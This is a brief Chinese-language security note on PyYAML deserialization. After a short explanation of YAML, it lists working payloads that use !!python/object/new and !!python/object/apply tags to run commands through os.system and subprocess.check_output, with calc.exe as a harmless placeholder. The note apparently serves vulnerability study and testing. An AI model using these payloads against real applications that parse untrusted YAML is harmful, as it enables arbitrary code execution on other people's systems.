参考：
	- https://github.com/bit4woo/code2sec.com/blob/master/Python%20PyYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AE%9E%E9%AA%8C%E5%92%8Cpayload%E6%9E%84%E9%80%A0.md

yaml和xml、json等类似，都是标记类语言，有自己的语法格式。各个支持yaml格式的语言都会有自己的实现来进行yaml格式的解析（读取和保存），其中PyYAML就是python的一个yaml库。

在当前的最新版本中payload为：
```python
import yaml

yaml.load('!!python/object/new:os.system ["calc.exe"]',Loader=yaml.Loader) 

'''
!!python/object/apply:subprocess.check_output [[calc.exe]]

!!python/object/apply:subprocess.check_output ["calc.exe"]

!!python/object/apply:subprocess.check_output [["calc.exe"]]

!!python/object/apply:os.system ["calc.exe"]

!!python/object/new:subprocess.check_output [["calc.exe"]]

!!python/object/new:os.system ["calc.exe"]
'''
```